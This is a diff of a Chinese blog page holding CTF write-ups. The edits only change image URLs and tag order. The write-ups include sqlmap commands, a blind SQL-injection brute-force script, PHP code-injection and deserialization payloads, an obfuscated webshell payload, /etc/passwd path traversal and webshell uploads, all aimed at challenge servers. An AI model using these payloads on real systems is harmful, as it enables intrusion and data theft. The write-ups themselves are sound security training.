@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CTFs.18.7"><meta name="keywords" content="WriteUp,CTF"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>CTFs.18.7 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CTFs.18.7"><meta name="keywords" content="CTF,WriteUp"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>CTFs.18.7 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
   hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
@@ -28,7 +28,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><code>flag{num_test_administrator}</code></p>
 <h3 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h3><p>开始也没发现什么，就抓包用sqlmap跑了</p>
 <p>跑了半天，也能跑出来</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5c7c1.png" alt="s18.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2fcf5c7c1.png" alt="s18.png"></p>
 <p><code>python sqlmap.py -r /Users/xc/Desktop/post.txt --dbs --drop-set-cookie -D bugkusql1 -T flag1 --dump</code></p>
 <p>flag就是那串字符放到flag{}里</p>
 <p>这个手动注入也可以，就是换成了<code>&quot;</code>，也没过滤。。。</p>
@@ -38,7 +38,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><code>http.request.method==&quot;POST&quot;</code></p>
 <p>然后搜索flag字符串，有两个结果，其中一个最后有类似base64的编码</p>
 <p>解码得到图片地址</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2db89.png" alt="s19.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2fcf2db89.png" alt="s19.png"></p>
 <p>是个二维码，扫描得到flag</p>
 <p><code>flag{1542ae716e47576e1f3e36326a23e72e}</code></p>
 <h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>测试发现空格被过滤，用注释填充</p>
@@ -47,7 +47,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>一开始sqlmap跑出injection库和admin表，password弄不出来</p>
 <p>用的python脚本:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">dic = &apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for d in dic:</span><br><span class="line">        pl=&quot;admin&apos;/**/and/**/(substr((select/**/password/**/from/**/admin),%s,1)=&apos;%s&apos;)/**/and/**/&apos;1&apos;=&apos;1&quot; %(str(i),d)</span><br><span class="line">        data = &#123;&apos;username&apos;:pl,&apos;password&apos;:&apos;2333&apos;&#125;</span><br><span class="line">        r = s.post(url,data)</span><br><span class="line">        if (&apos;密码错误&apos; in r.content):</span><br><span class="line">        	flag += d</span><br><span class="line">        	print flag</span><br><span class="line">        	break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5e495.png" alt="s20.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2fcf5e495.png" alt="s20.png"></p>
 <p>后来发现sqlmap也是能跑出来的</p>
 <p><code>python sqlmap.py  -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --forms --tamper=space2comment -D injection -T admin -C id,username,password --dump</code></p>
 <h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>首先dirb发现<code>.git</code>代码泄露，用githack扒下来源码</p>
@@ -71,7 +71,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><code>page=233&#39;) or print(file_get_contents(&#39;templates/flag.php&#39;));%23</code></p>
 <p><code>;</code>后面加%23或//用来注释</p>
 <p>flag</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2aa32.png" alt="s21.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2fcf2aa32.png" alt="s21.png"></p>
 <h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><p>入口：<a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p>
 <blockquote>
 <p>全都tm过滤了绝望吗？</p>
@@ -81,7 +81,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 </blockquote>
 <p>一边手动测试，一边扫目录找源代码泄露</p>
 <p>找到了flag</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6ac21.png" alt="s22.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb6ac21.png" alt="s22.png"></p>
 <p>没看到网上有注入的wp</p>
 <p><code>flag{sql_iNJEct_comMon3600!}</code></p>
 <h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>提示：hint</p>
@@ -105,7 +105,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>其中88，888，8888，三个文件头为jpg类型</p>
 <p>修改后缀，88.jpg含二维码，888.jpg的hex里一段base64，foremost分离8888.jpg得到zip包，解压得到二维码</p>
 <p>按顺序三个连起来就是flag</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb64913.png" alt="s23.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb64913.png" alt="s23.png"></p>
 <p><code>flag{bilibili_silisili_panama}</code></p>
 <h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>不是很懂php的正则</p>
@@ -143,7 +143,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 </blockquote>
 <p>我还是觉得简单粗暴点好理解</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">        url = &apos;http://45.76.173.177:23334/?func_name=%00lambda_&apos;+str(i)</span><br><span class="line">        c = s.get(url).text</span><br><span class="line">        if &apos;flag&apos; in c:</span><br><span class="line">                print(c)</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6906a.png" alt="s24.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb6906a.png" alt="s24.png"></p>
 <p>跑出来的时候差点忘了是哪个题</p>
 <h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">	if(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">	die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
 <p>首先</p>
@@ -175,9 +175,9 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>不过没想到要用serpent解密，serpent也有蛇的意思</p>
 <p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p>
 <p>类似的加密：</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6610c.png" alt="s262.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb6610c.png" alt="s262.png"></p>
 <p>anaconda就是key了</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb3696e.png" alt="s25.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb3696e.png" alt="s25.png"></p>
 <p><code>CTF{who_knew_serpent_cipher_existed}</code></p>
 <p>#0x04</p>
 <h3 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -192,11 +192,11 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>构造<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
 <p><code>file=hint.php</code>里有Flag类</p>
 <p>payload： <code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb0334e.png" alt="s29.png"></p>
-<h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p><img src="https://i.loli.net/2018/07/29/5b5d2efb3384e.png" alt="s30.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb0334e.png" alt="s29.png"></p>
+<h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb3384e.png" alt="s30.png"></p>
 <p>没有什么多的提示</p>
 <p>python，写个5位字典，burp爆破即可</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d2efb34fd6.png" alt="s31.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d2efb34fd6.png" alt="s31.png"></p>
 <p>13579</p>
 <p><code>flag{bugku-baopo-hah}</code></p>
 <h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>源码里提示1p.html</p>
@@ -213,14 +213,14 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>然后将得到的base64解码，有flag字样，似乎是一个压缩包</p>
 <p>这里太坑了，要用notepad++的base64插件解码再保存才能看到RAR文件的结尾标志C43D7B00400700</p>
 <p>然后加上标志头526172211A0700，打开</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d68f5246a2.png" alt="s33.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d68f5246a2.png" alt="s33.png"></p>
 <p><code>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</code></p>
 <h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片里有着一大段16进制数据</p>
 <p>xxd命令处理，在重定向到输出文件</p>
 <p>得到坐标</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d7095709da.png" alt="s34.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d7095709da.png" alt="s34.png"></p>
 <p>不太会脚本处理，用gnuplot工具输出二维码</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5d712c74ffd.png" alt="s35.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b5d712c74ffd.png" alt="s35.png"></p>
 <p><code>flag{40fc0a979f759c8892f4dc045e28b820}</code></p>
 <h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>看url：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p>
 <p>那应该有个shell什么的</p>
@@ -245,11 +245,11 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><code>+</code>要url编码为%2b</p>
 <p><code>http://120.24.86.145:9010/?content=$_=&#39;&#39;;$_[%2b$_]%2b%2b;$_=$_.&#39;&#39;;$__=$_[%2b&#39;&#39;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#39;_&#39;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</code></p>
 <p>获得shell的url后，上菜刀就行</p>
-<p><img src="https://i.loli.net/2018/07/31/5b60254b13ea2.png" alt="s1.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b60254b13ea2.png" alt="s1.png"></p>
 <h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>pcapng文件，Wireshark打不开，文件错误</p>
 <p>对比文件头，没修改成功</p>
 <p>直接搜索flag</p>
-<p><img src="https://i.loli.net/2018/08/01/5b616683c9373.png" alt="s2.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfs_18_7.assets/5b616683c9373.png" alt="s2.png"></p>
 <h3 id="Do-you-know-upload？"><a href="#Do-you-know-upload？" class="headerlink" title="Do you know upload？"></a>Do you know upload？</h3><p>有个提示</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">include($_GET[&apos;file&apos;]); </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>这里可以用<code>file=../../../../../../../../etc/passwd</code>读文件</p>
@@ -260,7 +260,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>抓包修改，上传一句话，在config.php中得到mysql账号</p>
 <p>登陆mysql获取flag表中的flag值</p>
 <p><code>flag{00e0fb52-6f65-486c-ab4a-4e8b39344940}</code></p>
-<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/07/25/ctfs_18_7/">http://j0k3r.top/2018/07/25/ctfs_18_7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/07/inject/"><i class="fa fa-chevron-left">  </i><span>代码审计之SQL注入</span></a></div><div class="next-post pull-right"><a href="/2018/07/24/command-excu/"><span>shell中的正则和通配符&amp;&amp;命令执行漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/07/25/ctfs_18_7/">http://j0k3r.top/2018/07/25/ctfs_18_7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/07/inject/"><i class="fa fa-chevron-left">  </i><span>代码审计之SQL注入</span></a></div><div class="next-post pull-right"><a href="/2018/07/24/command-excu/"><span>shell中的正则和通配符&amp;&amp;命令执行漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
 var verify = 'true' == true ? true : false;
 var GUEST_INFO = ['nick','mail','link'];
 var guest_info = 'nick,mail,link'.split(',').filter(function(item){
